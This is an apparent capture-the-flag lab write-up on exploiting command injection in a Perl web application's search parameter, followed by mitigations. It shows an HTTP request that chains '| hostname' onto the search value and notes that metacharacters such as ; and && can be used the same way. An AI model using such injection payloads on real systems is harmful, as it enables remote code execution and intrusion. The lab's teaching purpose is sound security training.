# Basic Command Injection - Perl System() Exploitation

## 🎯 Objective
Exploit a command injection vulnerability in a Perl-based web application to execute arbitrary system commands.

## 🔍 Vulnerability Analysis
- **Type:** Command Injection
- **Endpoint:** Search functionality
- **Parameter:** `search`
- **Detection:** User input passed directly to Perl's `system()` function without sanitization
- **Impact:** Remote code execution with web server privileges

## 💥 Exploitation
```http
GET /search?search=canon-eos-rebel-t7 | hostname HTTP/1.1
Host: living-ink.apac01.hackviser.space
Result: Pipe character (|) allowed command chaining, executing hostname command and returning: brilliance

🛡️ Mitigation Strategies
Input Sanitization: Strictly validate and sanitize user input before command execution

Parameterized Commands: Use parameterized approaches instead of string concatenation

Allow Lists: Implement command and argument allow lists

Least Privilege: Run web server with minimal necessary privileges

📊 Skills Demonstrates
Command Injection Detection: Identifying vulnerable command execution patterns

Shell Metacharacter Exploitation: Leveraging |, ;, &&, etc. for injection

Perl Security: Understanding Perl-specific command execution vulnerabilities

Privilege Analysis: Assessing execution context and potential impact

Conducted in controlled environment for educational purposes
